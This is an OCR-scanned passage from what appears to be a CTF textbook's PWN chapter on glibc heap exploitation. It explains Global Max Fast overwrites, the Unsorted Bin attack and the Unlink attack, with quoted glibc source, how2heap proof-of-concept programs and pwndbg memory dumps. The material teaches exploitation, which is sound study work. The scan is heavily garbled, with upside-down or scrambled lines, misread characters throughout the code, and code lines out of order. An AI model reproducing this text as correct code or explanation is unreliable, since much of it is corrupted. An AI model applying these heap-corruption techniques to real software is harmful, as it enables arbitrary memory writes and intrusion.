0x80 : 0x0
pwndbg>
2. Global Max Fast
Global Max Fast is the maximum value of the chunk decided to be managed with
Fast Bin, i.e., Ptmalloc2 will treat all chunks smaller than it as Fast Bin. Because of
    se  s  pe   no a ps 
easily bypass the check and exploit the vulnerability. In general, rewriting Global
Max Fast makes exploiting vulnerabilities easier and more straightforward.
A closer look at the source code of Ptmalloc2 shows that when getting the Fast
Bin chain table of the corresponding size, it is based on the idx value obtained from
the current size and then looked up in the fastbins Y data of the current arena.
#define  fastbin (az_ptr, idx)( (ar_ptr) ->fastbinsY[idx] )
The idx of the fastbin is computed according to the size, and if the size gets larger,
the value of the idx gets larger.
#define fastbin_index (sz) ((( (unsigned int) (sz)) >> (SIzg_Sz == 8 ? 4 :
3 ) )) - 2)
---
## Page 481
6PWN
The malloc_state struct is defined as follows, and the size of the fastbinsY array is
fixed. That is, if we rewrite Global Max Fast to allow the heap manager to use Fast
Bin to manage chunks larger than the original chunk, the fastbinsY array will have
an array overflow. The location of arena is in the bss segment of glibc, which means
that we can use the rewriting of Global Max Fast to handle chunks of a specific size,
which in turn allows us to write a heap address at any address after arena.
#define
#define
MAX_FAST_SIZE
(fastbin_index (request2size
(80 + SIZE_SZ / 4)
(MAX_FAST_SIZB)) + 1)
NFASTBINS
struct malloc_state {
/+ Serialize access.
/+ Flags (formerly in max_fast) . +/
_1ibc_lock_define (, mutex) ;
dnt flags;
mfastbinptr fastbinsY [NFASTBINS] :
/+ Fastbins */
/+ Base of the topmost chunk -- not otherwise kept in a bin */
mchunkptx top:
/+ The remainder from the most recent split of a small request +/
/ + Normal bins packed aa deseribed above */
mchunkptr last_remainder;
/+ Bitmap of bins */
mchunkptr bins [NBINS * 2 - 2] ;
unsigned int binmap [BINMAPSIZE] :
/+ Linked list */
struct malloc_state *next ;
/+ Linked list for free arenas. Access to this field is serialized
by free_list_lock in arena.c. */
struct malloc_state *next_free;
/+ Number of threads attached to this arena. 0 if the arena is on the free
list.
Access to thie tield is serialized by free_liat_lock in arena .c. */
INTERNAL_SIZE_T attached_threads ;
/+ Menory allocated fron the eyeten in this arena. */
INTERNAL_SIzE_T aysten_mem;
INTERNAL_SIZE_T max_ayatem_mem;
J :
Although the limitation of only being able to write to heap addresses is relatively
large, if we can control the fd pointer of the Fast Bin, we can achieve arbitrary
address writing.
6.6.3.3  Unsorted Bin List
If the chunk is not in the range of Fast Bin, it will be placed in Unsorted Bin first after
it is freed. If it is not the size of Fast Bin and no suitable chunk is found in Small Bin,
it will be searched from Unsorted Bin. Unsorted Bin is a Double-linked list structure
---
## Page 482
6.6 Heap
469
that splits back if it finds exactly the right chunk. Unsorted Bin lookup process is not
strictly checked, so we can insert a fake chunk into the Unsorted List to obfuscate the
Ptmalloc2 manager and allocate it to the target memory we want. The following file
from the how2heap project, unsorted_bin_into_stack.c, explains the attack.
#include 
#include 
#include 
int main(1 {
intptr_t stack_buffer [4] - (o} :
intptr_t* victin = nalloc (0x100) ;
fprintf (stderr, *Allocating the victim chunk`n*) :
fprintf (stderr, "Allocating another chunk to avoid consolidating the
top chunk with
the sma11 one during the fxee () \n*) ;
intptr_t* p1 = ma11oc (ox100) ;
fprintf (stderr, *Freeing the chunk p, it wi1l be inserted in the
unsorted bin\,n*, victim) ;
free (victim) ;
fprintf (stderr, *Create a fake chunk on the stack*) :
writable address*) ;
fprintf (stderr, *Set size for next allocation and the bk pointer to any
stacx_buffez[1] = 0x100 + 0x10;
stack_buffez [3] = (intptz_t) stack_buffex ;
fprintf (stderr, "Now emulating a vulnerability that can overvrite the
-- -VULNERABILITY -*-
victim->size and
victim->bk pointer`\n*) ;
fprintf (stderr, *Size should be different from the next request size
to return
fake_chunk and need to pass the check 2*SIZB_Sz (> 16 on x64) && system_mem\,n*) ;
victim[-1] = 32;
victim[1] = (intptz_t) stack_buffer; // victim->bk is pointing to
stack
/ / -
fprintf (stderr, *Nou next mal1oc wi1l return the region of our fake
chunk: &p\n*, &stack_buffer [2] ) ;
fprintf (stderr, *ma11oc (0x100) : $p^n*, ma11oc(0x100)) ;
By debugging, it is observed that the memory of Unsorted Bin is already present
in the heap manager when free(victim).
---
## Page 483
6PWN
pwndbg> unsortedbin
a11 : 0x602000 → 0x7ffff7dd1b78 (main_arena+88) + 0x602000
unsortedbin
Krou s,puot suod ypqm 1e '0e ou on dn unu [en dais-suo aq anuuo
layout is as follows.
pwndibg> x/20gx 0x602000
0x602000 :
0x602010: 0x00007ffff7dd1b78 0x00007fffffffe3d0
0000000000000000X0
0200000000000000X0
e  o sod xq pue ruue po sspe a o suod od p o
stack address. The memory arrangement of the target stack address is as follows.
pwndbg> x/20gx 0x00007fffffffe3d0
ox7fffffffe3e0:ox0o0ooooooooooooo ox00oo7fffffffe3do
Dx7fffffffe3do:
0×0000000000000000
0×0000000000000110
Its size is Ox110, fd is null, and bk is its own chunk address. We set the breakpoint on
the _int_malloc function.
pwndbg> b _int_ma11oc
Skip the extraneous code and look directly at the code that handles the Unsorted Bin
for (;;>{
/ Process the loop of unsorted bin, first get the first chunk in the chain
int iters = 0;
table.
whi1e ( (victim = unsorted_chunks (av) - >bk) 1= unsorted_chunks (av) 1 {
bck = victin->bk;
/ / Determine if victim is legal or not .
/ / bck 1s the second chunk
11 _builtin_expect (chunksize_nomask (victim) > av=>aystem_mem, 0) )
if (_bui1tin_expect (chunksize_nomask (victim) 1ast_remainder && (unsigned long) (size) > (unsigmed 1ong)
]( (ZISNIN + qU)
---
## Page 484
6.6Heap
471
renainder_size = size - nb;
/* split and reattach renainder */
renainder = chunk_at_offset (victim, nb) ;
unsorted_chunks (av) - >bk = unsorted_chunks (av) ->fd = renainder ;
av->last_remainder = remainder;
if [1in_smallbin_range (reminder_size) ) [
renainder- >bk = renainder- >fd = unsorted_chunks (av) ;
remainder->fd_nextsize = NULL;
remainder->bk_nextsize = NULL ;
set_head (victin, nb | PR.EV_INUSE I (av ! = &main_arena ?
NON_MAIN_ARENA : 0) ) :
set_head (xemainder, remainder_size | PREV_INUS8) :
set_foot (remainder, remainder_size) :
: (mtaoa) wouzxunqo = d pton
check_ma11oced_chunk (av, victim, nb) ;
alloc_perturb (p, bytes) ;
return p;
/+ renove from unsorted list */
unsorted_chunks (av) - >bk = bck ;
bck->fd = unsorted_chunks (av) :
// If the size matches exactly, return the chunk.
/+ Take now instead of binning if exact fit */
if (size == nb) {
if (av ! = &main_arena)
set_inuse_bit_at_offset (victim, size) ;
check_ma1Loced_ehunk (av, victim, nb) :
set_non_main_arena (victim) ;
 (wTaoa) wauzunqo = d pton
alloc_perturb (p, bytes) ;
return p:
/* place chunk in bin */
put it into the corresponding bin.
/ / Process the chunk Ln the unsorted bin, depending on its size, and
if (in_smallbin_range (size))(
victim_index = smallbin_index (size) ;
bck = bin_at (av, victim_index) ;
fvd = bck->fd;
else {
上
/ / Process large bin.
// Insert double-1inked table
mark_bin (av, victim_index) ;
---
## Page 485
472
6PWN
v1ctim->bk = bck;
victim->fd = fwd;
bck->fd = victim;
fwd- >bk = victim;
#define MAX_ITERS
if (+++itere >= MAX_ITERS)
10000
break;
In which you can see:
while ( (victin = unsorted_chunks (av) - >bk) 1= unsorted_chunks (av))
First, get the first chunk in the unsoted bin list; the victim we get here is the one we
started with free.
$1 = (mchunkptz) ox602000
pwndbg> print vietim
According to bck = victim->bk'", we know that bck is the target stack address,
which can be seen in GDB.
pwndbg> print bck 
S2 = (mchunkptx) ox7fffffe3d0
Continuing on.
1f (in_smallbin_range (nb) && bck == unsorted_chunks (av) &&
victim == av->last_renainder && {unsigned long) (size) > [unsigned
long) (nb + MINSIZB))
Since victim is not last_remainder and size is not satisfied, it does not enter this
branch.
Scrolling down, the following can be observed.
/ * renove from unsorted list +/
unsorted_chunks (av) - >bk = bck ;
bck->fd = unsorted_chunks (av) :
The heap manager writes a main_arena address to the memory pointed to by the
bk pointer to victim when it takes out victim. The state of the target stack memory at
this point is.
---
## Page 486
6.6 Heap
pwndbg> x/20gx 0x7fffffffe3d0
ox7fffffffe3e0: 0x0o0o7ffff7dd1b78 0x00oo7fffffffe3d0
ox7fffffffe3do:
0x0000000000000000×0000000000000110
If the requested memory exactly matches the size of victim, that is, if (size =
nb) is met, the chunk is returned and the memory request is finished. This process is
the Unsorted Bin Attack, which modifies the bk address of the Unsorted Bin by
writing the address of the main arena to the up Ox10 offset of the target memory.
(oxx) (aspo pfd;
mark_bin (av, victim_index) :
victim->fd = fwd;
v1ctim- >bk = bck;
fwd- >bk = victim;
bck->fd = victim;
Get the corresponding size of the Bin chain and then insert it into its head.
The processing of Large Bin is complex, and we will explain its logic in more
detail later on.
At this point, victim's chunk has been placed in smallbins.
pwndbg> sma11bins
0x20: 0x602000 → 0x7ffff7dd1b88 (main_azena+104) + 0x602000
sma1lbins
At the end of the first loop, go back to the beginning of the loop, and at this point
get victim as the target stack address and bck as the adress pointed to by victim’s bk
pointer. Note that bck must be a legal address because when a new victim is removed
from the Unsorted Bin List, the main_arena address is written to the address pointed
to by bck. If bck points to memory that is not legal, it will cause the adress to be
written illegally causing the program to terminate and exit.
unsorted_chunks (av) ->bk = bck;
/ * renove from unsorted list */
bck->fd = unsorted_chunks (av) :
Then detemine the chunk size.
if (size == nb)
---
## Page 487
474
6PWN
Here the size of victim is the same as the size we requested, so setting the chunk
information directly returns the memory pointed to by victim, which is the target
stack address.
if (size == nb) {
set_inuse_bit_at_offset (victim, size) ;
if (av ! = &main_arena)
set_non_nain_arena (victim) ;
check_malloced_chunk (av, victim, nb) :
alloc_pezturb (p, bytes) ;
 (wTaoA) mougumqo = d pton
return p:
6.6.3.4 Unlink Attack
When a Bin is deleted from the Bin List, the unlink operation is triggered. The logic
of the unlink operation in Glibc is not complicated, but there are many operations
can trigger it in Glibc. For example, when Glibc encountering adjacent free memory
for merging, or finding suitable chunk and remove it from the double-linked list, etc.
The source code of Unlink in Glibc is as follows.
/ * Take a chunk off a bin list +/
#define unlink (AV, P, BK, FD) (
bk;
if (_builtin_expect (FD->bk 1= P || BK->fd != P, 0))
malloc_printerr (check_action, *corrupted double-1inked 1ist", P,
AV) ; \
else 
x = xqfd = FD;
if (1in_sma11bin_range (chunksize_nomask (P))
&& _builtin_expect (P->fd_nextsize I= NULL, 0)) 
if (__bui1tin_expect (P->fd_nextsize ->bk_nextsize != P, 0)
11 _builtin_expect (P ->bk_nextsize- >fd_nextsize != P, 0) 1
malloc_printerr (check_action, *corrupted double-1inked 1ist
(not sna11) *, P, AV) \
if (FD->fd_next.size == NULL) (
if (P->fd_nextsize == P)
FD->fd_nextsize = FD->bk_nextsize = FD;
else {
FD->fd_nextaize = P->fd_nextsize;
FD- >bk_nextsize = P->bk_nextsize;
P->fd_nextsize->bk_nextsize = FD ;
P->bk_nextsize->fd_nextsize = FD;
---
## Page 488
6.6 Heap
475
else {
P- >fd_nextsize- >bk_nextsize = P- >bk_nextsize;
P- >bk_nextsize->fd_nextsize = P->fd_nextsize;
Unlink is a basic operation when dealing with double-linked list, and there is a
strict check that checks the integrity of the double-linked list. However, we can still
re d iuy pue tossno auod usn q xo o ssedq
address write to exploit the vulnerability. The following code is a sample from the
rnqe d on xu sn o mou uedxo m yu uo pofod deuo
memory write.
#include 
#include 
#include 
#include 
uint64_t *chunko_ptr;
int main (1 
fprintf (stderr, *Helcome to unsafe unlink 2.0!\n*) ;
fprintf (stderr, *This technique can be used vhen you have a pointer at a
fprintf (stderr, *Tested in Ubuntu 14 .04/16 .04 64bit . \n") ;
known location
to a region you can call unlink on. \n*) ;
fprintf (stderr, *The most common scenario is a vulnerable buf fer that
can be overflown
and has a global pointer. \n*) ;
int ma11oc_size = 0x80;
//ve want to be big enough not to use
fastbins
int header_size = 2;
fprintf (stderr, *The point of this exercise is to use free to corrupt
the globa1
chunko_ptr to achieve arbitrary memozy vrite . \n^n*) :
chunk0_ptr = (uint64_t*) ma11oc malloc_size) ;
uint64_t *chunk1_ptr = (uint64_t+) mal1oc (ma11oc_size) ;
//chunko
fprintf (stderr, *The global chunko_ptr is at p, pointing to $p\n",
//chunk1
&chunko_ptr, chunko_ptr) ;
fprintf (stderr, *The victim chunk we are going to corrupt is at p^n
\n", chunk1_ptr) ;
fprintf (stderr, *He create a fake chunk inside chunko . \n") ;
fprintf (stderr, "We setup the 'next_free_chunk’ (fd) of our fake chunk
to point near
---
## Page 489
476
6PWN
chunko_ptz [2] = (uint64_t) & chunko_ptr- (sizeof (uint64_c) *3) ;
to &chunk0_ptr so that P- >fd->bk = P. \n*) ;
fprintf (stderr, "we setup the 'previous_free_chunk' (bk) of our fake
chunk to point
fprintf (stderr, *vith thie setup we can pass this check: (P- >fd->bk 1=
near to &chunk0_ptr so that P ->blk->fd = P. (n*) ;
P ↓| P->bk->fd = P) == False\n) ;
chunk0_ptx [3] = (uint64_t) & chunko_ptz- (eizeof (uint64_c) 2) ;